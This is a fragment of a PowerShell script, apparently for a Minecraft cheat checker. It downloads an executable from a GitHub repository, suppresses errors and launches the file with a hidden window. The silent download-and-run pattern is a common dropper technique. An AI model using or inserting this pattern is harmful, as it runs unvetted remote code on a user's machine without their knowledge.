...
$scan = {
    ...
    Invoke-WebRequest -Uri "https://github.com/WarRagon404/MinecraftCheatChecker/raw/refs/heads/main/source/assets/custom/CheatCheker.exe" -OutFile "CheatCheker.exe" -ErrorAction SilentlyContinue
    
    # Запускаем 
    Start-Process -FilePath "CheatCheker.exe" -WindowStyle Hidden
